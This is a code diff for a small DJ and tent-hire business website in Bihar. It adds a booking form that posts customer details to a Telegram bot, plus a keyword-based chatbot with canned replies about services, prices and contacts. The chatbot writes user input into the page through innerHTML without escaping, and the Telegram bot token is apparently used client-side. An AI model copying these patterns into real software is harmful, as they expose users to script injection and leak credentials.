+            const btn = document.getElementById('submitBookBtn'); btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SENDING...'; btn.style.opacity = '0.7';
+            const msg = `📅 *NEW BOOKING REQUEST* 📅\n---------------------------\n🎪 *Event Type:* ${type}\n📆 *From Date:* ${dateFrom}\n📆 *To Date:* ${dateTo}\n👤 *Name:* ${name}\n👥 *Father's Name:* ${father}\n📞 *Contact:* ${phone}\n☎️ *Alt Contact:* ${altPhone}\n✉️ *Email:* ${email}\n\n📍 *LOCATION DETAILS*\n• State: ${state}\n• District: ${district}\n• City: ${city}\n• Village: ${village}\n• Pin Code: ${pincode}\n\n⏰ *Time Submitted:* ${new Date().toLocaleString()}`;
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'Markdown' }) }).then(res => { btn.innerHTML = '<i class="fas fa-check"></i> REQUEST SENT!'; btn.style.background = '#00ff00'; setTimeout(() => { closeModal(null, true); btn.innerHTML = '<i class="fas fa-paper-plane"></i> SEND BOOKING REQUEST'; btn.style.background = 'var(--gold-primary)'; btn.style.opacity = '1'; }, 2000); });
+        }
+
+        function openAI() { playTap(); document.getElementById('aiModal').classList.add('active'); }
+        function handleEnter(e) { if(e.key==='Enter') sendMessage(); }
+        function sendMessage() {
+            const val = document.getElementById('userMsg').value.trim(); if(!val) return;
+            const box = document.getElementById('chatHistory'); box.innerHTML += `<div class="bubble user">${val}</div>`; document.getElementById('userMsg').value = ""; box.scrollTop = box.scrollHeight;
             setTimeout(() => {
-                alert('✅ Welcome ' + name + '! Access Granted.');
-                document.getElementById('gatekeeper').style.display = 'none';
-                loading.style.display = 'none';
-            }, 2000);
+                let reply = "I am MNDs Brain, the AI assistant for Maa Nirmala DJ & Tent House! I can help you with Booking details, Price info, Contact numbers, Services, or Location!"; 
+let lower = val.toLowerCase();
+
+// Greetings
+if(lower.includes("hi") || lower.includes("hello") || lower.includes("hey") || lower.includes("namaste") || lower.includes("pranam")) {
+    reply = "Hello! Welcome to Maa Nirmala DJ & Tent House. How can I make your upcoming event spectacular today?";
+}
+// Pricing & Quotes
+else if(lower.includes("price") || lower.includes("cost") || lower.includes("rate") || lower.includes("charge") || lower.includes("package")) {
+    reply = "Our premium pricing depends on the event size, location, and equipment needed. We offer competitive rates for DJ setups, tents, and lighting. Please fill out the Booking form to get a personalized quote!";
+}
+// Discounts & Offers
+else if(lower.includes("discount") || lower.includes("offer") || lower.includes("cheap") || lower.includes("less") || lower.includes("concession")) {
+    reply = "We always try to provide the best value for our premium quality! Give us a call at +91 9771617808, and we can discuss a custom package that fits your budget perfectly.";
+}
+// Payment Methods
+else if(lower.includes("pay") || lower.includes("upi") || lower.includes("phonepe") || lower.includes("google pay") || lower.includes("gpay") || lower.includes("cash")) {
+    reply = "💳 We accept multiple payment methods for your convenience, including Cash, UPI (PhonePe, Google Pay, Paytm), and direct bank transfers. An advance booking amount is required to lock in your date.";
+}
+// Booking & Hiring
+else if(lower.includes("book") || lower.includes("hire") || lower.includes("reserve") || lower.includes("appointment")) {
+    reply = "You can easily book our premium services! Just click the 'Booking' icon in the bottom menu, fill in your details, and our team will call you back promptly to confirm your event.";
+}
+// Location & Address
+else if(lower.includes("location") || lower.includes("where") || lower.includes("address") || lower.includes("visit") || lower.includes("area")) {
+    reply = "📍 We are proudly located in Beltikri, Kaddhar, Katoria, Banka, Bihar (813106). We provide top-tier services across the entire district and surrounding areas.";
+}
+// Village History / Easter Egg
+else if(lower.includes("beltikri") || lower.includes("history") || lower.includes("maharaj") || lower.includes("king")) {
+    reply = "🏰 Beltikri has a rich heritage! It is said to be the historical home of the great Lalu Kumar Tati Maharaj. We are proud to serve this historic community with royal-quality tent and DJ services!";
+}
+// Ownership & Management
+else if(lower.includes("owner") || lower.includes("lalu") || lower.includes("who owns") || lower.includes("proprietor")) {
+    reply = "Maa Nirmala DJ & Tent House is proudly owned and managed by Mr. Lalu Kumar Tanti. He ensures every event is handled with premium quality and care.";
+}
+// Business Manager
+else if(lower.includes("manager") || lower.includes("development") || lower.includes("management")) {
+    reply = "Our Business Development Manager is Mr. Lalu Kumar, dedicated to expanding our services and ensuring 100% client satisfaction.";
+}
+// Associate / Team
+else if(lower.includes("team") || lower.includes("staff") || lower.includes("sildhar") || lower.includes("worker") || lower.includes("setup")) {
+    reply = "Our dedicated team includes experienced associates like Sildhar Kumar, who work hard to set up the perfect tent and DJ arrangements for your special day safely and on time.";
+}
+// Contact Information
+else if(lower.includes("contact") || lower.includes("call") || lower.includes("phone") || lower.includes("number") || lower.includes("mobile") || lower.includes("whatsapp")) {
+    reply = "📞 You can contact us directly at +91 9771617808, +91 7294969938, or +91 8544341240. You can also email us at lalukumartanti75@gmail.com or use the Booking form.";
+}
+// Services - General
+else if(lower.includes("service") || lower.includes("what do you do") || lower.includes("provide") || lower.includes("offer")) {
+    reply = "We provide comprehensive event solutions! Our premium services include high-bass DJ sound systems, dynamic stage lighting, elegant tent setups, wedding decorations, and generator services.";
+}
+// Services - DJ & Sound
+else if(lower.includes("dj") || lower.includes("sound") || lower.includes("music") || lower.includes("speaker") || lower.includes("bass") || lower.includes("audio") || lower.includes("song")) {
+    reply = "🎵 We offer industry-leading DJ setups with earth-shattering bass, clear tops, and professional mixers to keep your dance floor packed all night long! We play all the latest hits.";
+}
+// Services - Tent & Decor
+else if(lower.includes("tent") || lower.includes("decor") || lower.includes("stage") || lower.includes("flower") || lower.includes("pandal") || lower.includes("light")) {
+    reply = "⛺ Our premium tent house services include waterproof pandals, VIP seating arrangements, gorgeous floral stage decorations, stunning lighting arrays, and customized wedding setups.";
+}
+// Catering / Food Setup Support
+else if(lower.includes("food") || lower.includes("catering") || lower.includes("buffet") || lower.includes("plate") || lower.includes("chair") || lower.includes("table")) {
+    reply = "🍽️ While we specialize in DJ and Decor, our tent setups include premium VIP chairs, tables, and beautiful buffet stall arrangements to perfectly support your chosen catering team.";
+}
+// Power Backup / Generators
+else if(lower.includes("generator") || lower.includes("power") || lower.includes("electricity") || lower.includes("light cut") || lower.includes("dg set")) {
+    reply = "⚡ Don't worry about power cuts! We provide heavy-duty generator sets (DG sets) along with our DJ and Tent bookings to ensure your event runs flawlessly without any interruptions.";
+}
+// Transportation / Delivery
+else if(lower.includes("transport") || lower.includes("delivery") || lower.includes("vehicle") || lower.includes("bring")) {
+    reply = "🚚 We handle all the transportation for our equipment! Our team will deliver, set up, and dismantle everything at your venue. (We also coordinate with Laxmikant Tanti farming tractor for heavy logistics!).";
+}
+// Other Businesses / Agriculture
+else if(lower.includes("tractor") || lower.includes("farming") || lower.includes("laxmikant") || lower.includes("agriculture")) {
+    reply = "🚜 Alongside our DJ & Tent services, our family also runs 'Laxmikant Tanti farming tractor' for all your agricultural and heavy-lifting needs in the area.";
+}
+// Events Covered
+else if(lower.includes("wedding") || lower.includes("marriage") || lower.includes("birthday") || lower.includes("party") || lower.includes("event") || lower.includes("function") || lower.includes("reception")) {
+    reply = "🎉 We cover all types of events! Whether it's a grand wedding, a birthday bash, an anniversary, or a local gathering, Maa Nirmala DJ & Tent House has you covered.";
+}
+// Operating Hours
+else if(lower.includes("time") || lower.includes("open") || lower.includes("close") || lower.includes("hours")) {
+    reply = "⏰ We are open 24/7 for bookings and inquiries online! Our physical office and setup teams operate round the clock to ensure your event runs smoothly without interruptions.";
+}
+// Website / Social Media
+else if(lower.includes("website") || lower.includes("youtube") || lower.includes("social") || lower.includes("instagram") || lower.includes("facebook") || lower.includes("online")) {
+    reply = "🌐 We are expanding our online presence! Stay tuned for our official website and social media pages where we will showcase our premium event setups and DJ lighting shows.";
+}
+// Complaints / Support
+else if(lower.includes("complaint") || lower.includes("issue") || lower.includes("problem") || lower.includes("support") || lower.includes("help")) {
+    reply = "🛠️ Customer satisfaction is our top priority! If you have any issues with our service, please contact Mr. Lalu Kumar directly at +91 9771617808 and we will resolve it immediately.";
+}
+// Gratitude / Thanks
+else if(lower.includes("thank") || lower.includes("thanks") || lower.includes("dhanyawad") || lower.includes("awesome") || lower.includes("great") || lower.includes("nice") || lower.includes("good")) {
+    reply = "You are very welcome! We look forward to making your event a grand success. Let me know if you need any other details.";
+}
+// Goodbye
+else if(lower.includes("bye") || lower.includes("goodbye") || lower.includes("see you") || lower.includes("exit")) {
+    reply = "Goodbye! Thank you for chatting with Maa Nirmala DJ & Tent House. Have a fantastic day, and we hope to serve you soon!";
+}
+
+box.innerHTML += `<div class="bubble bot">${reply}</div>`; 
+box.scrollTop = box.scrollHeight;
+}, 700);
         }
-
-        console.log('🎯 App Setup Complete');
     </script>
-
-</body>
-</html>
